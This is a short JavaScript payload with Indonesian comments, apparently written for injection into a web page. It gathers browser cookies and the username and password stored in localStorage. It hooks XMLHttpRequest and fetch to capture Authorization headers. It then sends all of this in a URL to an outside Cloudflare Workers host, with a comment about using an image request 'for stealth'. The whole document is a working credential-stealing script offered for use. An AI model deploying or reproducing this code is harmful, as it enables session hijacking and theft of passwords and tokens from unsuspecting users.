// Kumpulkan data sensitif (contoh: cookie, username/password dari localStorage, header Authorization)
var stolenData = {
    cookies: document.cookie,
    username: localStorage.getItem('username') || 'none',
    password: localStorage.getItem('password') || 'none',
    authHeader: 'none'  // Akan diisi dari hook
};

// Hook XMLHttpRequest untuk mencegat header Authorization dari request
var originalOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url) {
    this.setRequestHeader = function(header, value) {
        if (header.toLowerCase() === 'authorization') {
            stolenData.authHeader = value;  // Simpan header Authorization
        }
        return XMLHttpRequest.prototype.setRequestHeader.apply(this, arguments);
    };
    return originalOpen.apply(this, arguments);
};

// Hook Fetch API
var originalFetch = window.fetch;
window.fetch = function(input, init) {
    if (init && init.headers && init.headers.Authorization) {
        stolenData.authHeader = init.headers.Authorization;
    }
    return originalFetch.apply(this, arguments);
};

// Kirim data ke worker Anda (gunakan GET dengan parameter message)
setTimeout(function() {  // Delay untuk memastikan hook menangkap data
    var dataString = encodeURIComponent(JSON.stringify(stolenData));  // Encode agar aman di URL
    var workerUrl = 'https://lucifer.yutupprem0.workers.dev/?message=' + dataString;
    
    // Kirim via fetch (atau img.src untuk stealth)
    fetch(workerUrl, { method: 'GET' });  // Worker menerima data di parameter message
}, 1000);  // Tunggu 1 detik agar request terjadi
